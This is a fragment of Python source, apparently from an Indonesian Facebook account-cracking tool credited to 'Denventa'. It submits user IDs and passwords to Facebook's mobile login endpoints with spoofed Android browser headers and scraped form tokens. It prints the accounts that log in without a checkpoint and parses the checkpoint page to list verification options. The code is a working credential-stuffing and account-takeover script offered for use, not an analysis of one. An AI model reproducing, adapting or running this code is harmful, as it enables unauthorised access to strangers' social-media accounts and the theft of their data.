                hed1 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','cache-control': 'max-age=0','referer': f'https://{url_login}/login/device-based/password/?uid='+self.id+'&errorcode=1348092&next=https%3A%2F%2F{url_login}%3Flogin%3Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
                req1 = xyz.get(url1,headers=hed1)
                data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),'uid' : self.id,'pass' : self.pw,'next' : f'https://{url_login}/login/save-device/','flow' : 'login_no_pin','submit' : 'Log In'}
                url2 = f'https://{url_login}/login/device-based/validate-password/?shbl=0'
                hed2 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','x-requested-with': 'mark.via.gp','cache-control': 'max-age=0','content-length': '159','content-type': 'application/x-www-form-urlencoded','origin': f'https://{url_login}','referer': f'https://{url_login}/login/device-based/password/?uid='+self.id+'&errorcode=1348092&next=https%3A%2F%2F{url_login}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
                exec = xyz.post(url2,data=data,headers=hed2,allow_redirects = False)
                if "c_user" in xyz.cookies.get_dict():
                    if "Akun Anda Dikunci" in exec.text:pass
                    else:
                        ubah = '   %s──> %s • %s%s               '%(H,self.id,self.pw,self.ttl)
                        print('\r%s\n       %s• %sAkun Tidak Checkpoint'%(ubah,H,P))
                elif "checkpoint" in xyz.cookies.get_dict():
                    pars = par(exec.content,'html.parser')
                    ling = re.search('url=(.*?)" http',str(pars)).group(1)
                    getd = par(xyz.get(ling).content,'html.parser')
                    bos = getd.find('form',{'method':'post'})
                    if 'approvals_code' in str(bos): pass
                    elif 'checkpointSubmitButton' in str(bos):
                        list_data1 = ['fb_dtsg','fb_dtsg','jazoest','submit[Continue]','nh']
                        for x in bos('input'):
                            if x.get('name') in list_data1:
                                data1.update({x.get('name'):x.get('value')})
                        exec2 = xyz.post('https://mbasic.facebook.com' + bos['action'],data=data1)
                        pars2 = par(exec2.content,'html.parser')
                        otp = re.findall("\<title>(.*?)<\/title>",str(pars2))
                        opsi = [y.text for y in pars2.find_all("option")]
                        if 'Lihat detail login yang ditampilkan. Ini Anda?' in otp:
                            ubah = '   %s──> %s • %s%s               '%(H,self.id,self.pw)
                            print('\r%s\n       %s• %sAkun Tap Yes'%(ubah,H,P))
                        elif 'Masukkan tanggal lahir Anda' in opsi:
                            try:
                                tol = self.out.split('•')[2]
                                ubah = '   %s──> %s • %s •%s               '%(H,self.id,self.pw,tol)
                                print('\r%s\n       %s• %sTerdapat Opsi TTL'%(ubah,H,P))
                                #self.ttl(pars2)
                            except Exception as e:
                                print('\r%s               '%(self.out))
                        else:
                            for z in opsi:
                                s += 1
                                tamp.append('\n       %s%s%s. %s%s'%(A,str(s),P,A,z))
                                pili = ('\r%s               '%(self.out))
                            print(pili+''.join(tamp))
                    else:print('\r%s               '%(self.out))
            except Exception as e:
                print('\r%s               '%(self.out))

def not_available(konten):
    print('')
    tamp_kesediaan = (f'   {P2}Mohon Maaf, Fitur {konten} Belum Tersedia Untuk Saat Ini. Tunggu Update Selanjutnya Untuk Menggunakan Fitur-Fitur Yang Akan Datang. Terima Kasih.\n\n                {M2}- Denventa -')
    printer(Panel(tamp_kesediaan,title=f'{M2}[  {P2}Coming  Soon  {M2}]',title_align='center',subtitle=f'{M2}[  {P2}See  You  {M2}]',subtitle_align='center',width=54,padding=(1,4),style='#FF0000'))
    input('\n\n               %s[ %sKembali Ke Menu Awal %s]              '%(H,P,H))
    tampilan_menu()

if __name__ == '__main__':
    resik()
    tampilan_menu()

# print('%s[%s•%s] %s'%(J,P,J,P))